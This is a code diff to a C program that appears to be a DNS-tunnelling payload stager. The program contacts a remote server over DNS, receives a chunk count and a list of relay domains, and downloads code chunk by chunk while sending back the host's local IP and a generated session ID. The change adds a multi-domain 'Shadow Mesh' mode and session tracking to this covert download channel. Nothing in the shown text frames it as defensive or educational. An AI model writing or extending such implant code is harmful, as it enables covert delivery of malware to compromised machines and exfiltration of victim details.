@@ -829,6 +829,8 @@ int main(int argc, char *argv[]) {
     char arch[32];
     char message[256];
     char response[4096];
+    char session_id[128] = "";
+    char dns_domains[512] = "";
     int total_chunks = 0;
     unsigned char **chunks = NULL;
     size_t *chunk_sizes = NULL;
@@ -867,19 +869,42 @@ int main(int argc, char *argv[]) {
     
     DEBUG_PRINT("[*] Received response: %s\n", response);
     
-    // Parse metadata response: META|<total_chunks>
+    // Parse metadata response: META|<total_chunks> or META|<total_chunks>|<dns_domains>|<session_id>
     if (strncmp(response, "META|", 5) != 0) {
     DEBUG_PRINT("[!] Invalid response format (expected META|)\n");
         return 1;
     }
     
-    total_chunks = atoi(response + 5);
-    DEBUG_PRINT("[*] Total chunks to download: %d\n", total_chunks);
+    // Parse the response - format: META|total_chunks|domain1,domain2,domain3
+    char *token = response + 5; // Skip "META|"
+    char *pipe1 = strchr(token, '|');
+    
+    if (pipe1) {
+        // New format with domains: META|chunks|domains
+        *pipe1 = '\0'; // Null terminate chunks part
+        total_chunks = atoi(token);
+        
+        // Extract domains
+        char *domains_start = pipe1 + 1;
+        strncpy(dns_domains, domains_start, sizeof(dns_domains) - 1);
+        dns_domains[sizeof(dns_domains) - 1] = '\0';
+        
+        DEBUG_PRINT("[*] Shadow Mesh mode: %d chunks, domains: %s\n", total_chunks, dns_domains);
+    } else {
+        // Legacy format: META|chunks (standalone mode)
+        total_chunks = atoi(token);
+        DEBUG_PRINT("[*] Standalone mode: %d chunks\n", total_chunks);
+    }
     
     if (total_chunks <= 0 || total_chunks > MAX_CHUNKS) {
     DEBUG_PRINT("[!] Invalid chunk count: %d\n", total_chunks);
         return 1;
     }
+    
+    // Generate session ID (timestamp + random)
+    snprintf(session_id, sizeof(session_id), "stg_%lu_%d", 
+             (unsigned long)time(NULL), rand() % 10000);
+    DEBUG_PRINT("[*] Session ID: %s\n", session_id);
     
     // Allocate chunk storage
     chunks = calloc(total_chunks, sizeof(unsigned char *));
@@ -904,8 +929,10 @@ int main(int argc, char *argv[]) {
         
         DEBUG_PRINT("[*] Requesting chunk %d/%d\n", i+1, total_chunks);
         
-        // Send ACK|<chunk_index>|<IP>|UNKN0WN (longer message with session identifier)
-        snprintf(message, sizeof(message), "ACK|%d|%s|UNKN0WN", i, local_ip);
+        // Send ACK|<chunk_index>|<IP>|<session_id>
+        // In Shadow Mesh mode, session_id is used; in standalone, it's "UNKN0WN"
+        snprintf(message, sizeof(message), "ACK|%d|%s|%s", 
+                 i, local_ip, session_id[0] ? session_id : "UNKN0WN");
         
         if (send_dns_message(message, response, sizeof(response)) != 0) {
     DEBUG_PRINT("[!] Failed to get chunk %d\n", i);
